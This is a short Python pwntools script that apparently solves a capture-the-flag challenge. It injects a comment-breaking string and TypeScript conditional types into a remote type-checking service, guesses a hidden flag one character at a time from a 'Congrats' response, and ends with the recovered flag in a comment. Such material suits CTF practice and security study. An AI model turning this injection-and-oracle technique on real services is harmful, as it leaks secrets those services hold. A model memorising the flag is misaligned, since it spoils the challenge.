from pwn import *
import re
import string


def do_one(flag, c):
    print("trying", c)
    name = "*/ const s = `"

    curr = ' ON 9/28/2023. THE FLAG IS "' + flag

    code = "\n".join(
        [
            "` as const",
            "const a: typeof s extends `${%r}${string}`?1:0=1" % (curr + c),
        ]
    )
    print(code)
    p = remote("chall.pwnoh.io", 13381)
    # p = remote("localhost", 1024)

    p.recvuntil(b"> ")
    p.sendline(name)
    p.recvuntil(b"> ")
    p.sendline(code)
    p.sendline(b"")
    log = p.recvall().decode()
    return "Congrats" in log


def do(flag):
    for c in string.printable:
        if do_one(flag, c):
            return c


from time import sleep

# bctf{4ny1_w4n7_50m3_4ny_04c975da}
flag = "bctf{"
while not flag.endswith("}"):
    print(flag)
    flag += do(flag)
# print(do_one("bctf{", "a"))
